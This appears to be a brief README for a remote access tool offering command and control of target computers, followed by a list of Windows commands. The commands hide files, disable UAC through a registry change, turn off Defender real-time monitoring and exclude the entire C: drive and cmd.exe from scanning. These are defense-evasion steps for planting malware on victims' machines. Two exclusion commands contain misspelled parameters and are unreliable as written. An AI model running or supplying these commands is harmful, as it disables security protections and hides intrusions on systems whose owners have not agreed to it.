This is a Remote access tool [RAT] that provides command and control [C2] of the target computers

## Resources
'''
#show files
attrib -h -s -r FILE
    
#hide file
attrib +h +s +r FILE

#disable uac with powershell
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0


## exclusion path
'''
Set-MpPreference -DisableRealTimeMonitoring true
Add-MpPreference -ExclusionPatch c:\
Add-MpPreference -EsclusionProcess c:\windows\system32\cmd.exe

'''